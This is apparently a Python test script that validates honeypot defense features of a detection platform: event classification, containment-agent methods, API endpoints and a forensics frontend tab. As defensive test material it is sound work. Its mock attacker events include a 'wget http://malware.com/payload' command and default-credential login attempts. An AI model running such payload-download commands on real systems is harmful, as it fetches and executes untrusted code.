#!/usr/bin/env python3
"""
Test script to verify honeypot defense features are working properly
"""
import sys
import os
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Any

# Add backend to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'backend'))

def test_event_classification():
    """Test the enhanced event classification system"""
    print("\n🧪 Testing Enhanced Event Classification...")
    
    try:
        from backend.app.main import _build_attack_timeline
        from backend.app.models import Event
        
        # Create mock events for testing
        class MockEvent:
            def __init__(self, eventid, src_ip, message, raw=None, ts=None):
                self.eventid = eventid
                self.src_ip = src_ip
                self.message = message
                self.raw = raw or {}
                self.ts = ts or datetime.utcnow()
        
        # Test real honeypot events
        real_events = [
            MockEvent("cowrie.login.failed", "1.2.3.4", "Failed login attempt", 
                     {"username": "admin", "password": "123456"}),
            MockEvent("cowrie.command.input", "1.2.3.4", "Command executed", 
                     {"input": "wget http://malware.com/payload"}),
            MockEvent("webhoneypot.request", "5.6.7.8", "SQL injection attempt",
                     {"path": "/login.php", "attack_indicators": ["sql_injection"]}),
        ]
        
        # Test events from startup script (should be marked as test)
        test_events = [
            MockEvent("cowrie.login.failed", "192.168.1.100", "Test event from startup script",
                     {"username": "admin", "password": "123456", "test_event": True, "test_type": "startup_validation"}),
            MockEvent("webhoneypot.request", "192.168.1.200", "GET /admin.php",
                     {"path": "/admin.php", "attack_indicators": ["admin_scan"], "test_event": True, "test_type": "adaptive_detection_validation"}),
        ]
        
        # Test real event classification
        real_timeline = _build_attack_timeline(real_events)
        print(f"✅ Real events classified:")
        for entry in real_timeline:
            print(f"   - {entry['event_id']}: {entry['attack_category']} (severity: {entry['severity']})")
        
        # Test test event classification
        test_timeline = _build_attack_timeline(test_events)
        print(f"✅ Test events classified:")
        for entry in test_timeline:
            print(f"   - {entry['event_id']}: {entry['attack_category']} (severity: {entry['severity']})")
        
        # Verify test events are properly marked
        test_categories = [entry['attack_category'] for entry in test_timeline]
        if all('test_' in category or category == 'test_event' for category in test_categories):
            print("✅ Test events properly marked with 'test_' prefix")
        else:
            print("❌ Test events not properly marked")
            return False
        
        # Verify real events are NOT marked as test
        real_categories = [entry['attack_category'] for entry in real_timeline]
        if not any('test_' in category for category in real_categories):
            print("✅ Real events not marked as test")
        else:
            print("❌ Real events incorrectly marked as test")
            return False
        
        print("✅ Event classification system working correctly")
        return True
        
    except Exception as e:
        print(f"❌ Event classification test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_honeypot_isolation():
    """Test the honeypot-aware isolation system"""
    print("\n🛡️ Testing Honeypot-Aware Isolation System...")
    
    try:
        from backend.app.agents.containment_agent import ContainmentAgent
        
        agent = ContainmentAgent()
        
        # Test that the honeypot detection methods exist
        if hasattr(agent, '_is_honeypot_environment'):
            print("✅ Honeypot environment detection method available")
        else:
            print("❌ Honeypot environment detection method missing")
            return False
        
        if hasattr(agent, '_execute_honeypot_isolation'):
            print("✅ Honeypot-specific isolation method available")
        else:
            print("❌ Honeypot isolation method missing")
            return False
        
        if hasattr(agent, '_redirect_to_isolated_honeypot'):
            print("✅ Honeypot redirection method available")
        else:
            print("❌ Honeypot redirection method missing")
            return False
        
        if hasattr(agent, '_enable_enhanced_monitoring'):
            print("✅ Enhanced monitoring method available")
        else:
            print("❌ Enhanced monitoring method missing")
            return False
        
        if hasattr(agent, '_apply_rate_limiting'):
            print("✅ Rate limiting method available")
        else:
            print("❌ Rate limiting method missing")
            return False
        
        print("✅ Honeypot isolation system components available")
        return True
        
    except Exception as e:
        print(f"❌ Honeypot isolation test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_api_endpoints():
    """Test the new API endpoints"""
    print("\n🌐 Testing New API Endpoints...")
    
    try:
        from backend.app.main import app
        from fastapi.testclient import TestClient
        
        # This would normally require a running server and database
        # For now, just verify the endpoints are defined
        
        routes = [route.path for route in app.routes]
        
        expected_endpoints = [
            "/incidents/{inc_id}/actions/honeypot-profile-attacker",
            "/incidents/{inc_id}/actions/honeypot-enhance-monitoring", 
            "/incidents/{inc_id}/actions/honeypot-collect-threat-intel",
            "/incidents/{inc_id}/actions/honeypot-deploy-decoy",
            "/incidents/real",
            "/honeypot/attacker-stats"
        ]
        
        missing_endpoints = []
        for endpoint in expected_endpoints:
            if endpoint not in routes:
                missing_endpoints.append(endpoint)
        
        if missing_endpoints:
            print(f"❌ Missing endpoints: {missing_endpoints}")
            return False
        else:
            print("✅ All new API endpoints defined")
            return True
        
    except Exception as e:
        print(f"❌ API endpoint test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_frontend_forensics():
    """Test that frontend forensics tab is implemented"""
    print("\n🔍 Testing Digital Forensics Frontend...")
    
    try:
        frontend_file = "/Users/chasemad/Desktop/mini-xdr/frontend/app/incidents/incident/[id]/page.tsx"
        
        with open(frontend_file, 'r') as f:
            content = f.read()
        
        # Check for forensics tab implementation
        if "activeTab === 'forensics'" in content:
            print("✅ Forensics tab conditional rendering found")
        else:
            print("❌ Forensics tab conditional rendering missing")
            return False
        
        # Check for key forensics components
        forensics_components = [
            "Evidence Collection & Analysis",
            "Digital Evidence", 
            "Forensic Analysis",
            "Evidence Details",
            "Chain of Custody"
        ]
        
        missing_components = []
        for component in forensics_components:
            if component not in content:
                missing_components.append(component)
        
        if missing_components:
            print(f"❌ Missing forensics components: {missing_components}")
            return False
        else:
            print("✅ All forensics components implemented")
        
        # Check for evidence display logic
        if "incident.iocs?.command_patterns" in content:
            print("✅ Command evidence display implemented")
        else:
            print("❌ Command evidence display missing")
            return False
        
        if "incident.iocs?.file_hashes" in content:
            print("✅ File evidence display implemented")  
        else:
            print("❌ File evidence display missing")
            return False
        
        print("✅ Digital forensics frontend properly implemented")
        return True
        
    except Exception as e:
        print(f"❌ Frontend forensics test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """Run all tests"""
    print("🧪 HONEYPOT DEFENSE FEATURES VALIDATION")
    print("=" * 50)
    
    tests = [
        ("Event Classification", test_event_classification),
        ("Honeypot Isolation", test_honeypot_isolation), 
        ("API Endpoints", test_api_endpoints),
        ("Frontend Forensics", test_frontend_forensics),
    ]
    
    results = {}
    
    for test_name, test_func in tests:
        try:
            results[test_name] = test_func()
        except Exception as e:
            print(f"❌ {test_name} test crashed: {e}")
            results[test_name] = False
    
    print("\n" + "=" * 50)
    print("📊 TEST RESULTS SUMMARY")
    print("=" * 50)
    
    total_tests = len(results)
    passed_tests = sum(1 for result in results.values() if result)
    
    for test_name, result in results.items():
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"{test_name:20} {status}")
    
    print(f"\nOverall: {passed_tests}/{total_tests} tests passed ({passed_tests/total_tests*100:.1f}%)")
    
    if passed_tests == total_tests:
        print("\n🎉 ALL HONEYPOT DEFENSE FEATURES ARE WORKING PROPERLY!")
        return True
    else:
        print(f"\n⚠️  {total_tests - passed_tests} features need attention")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
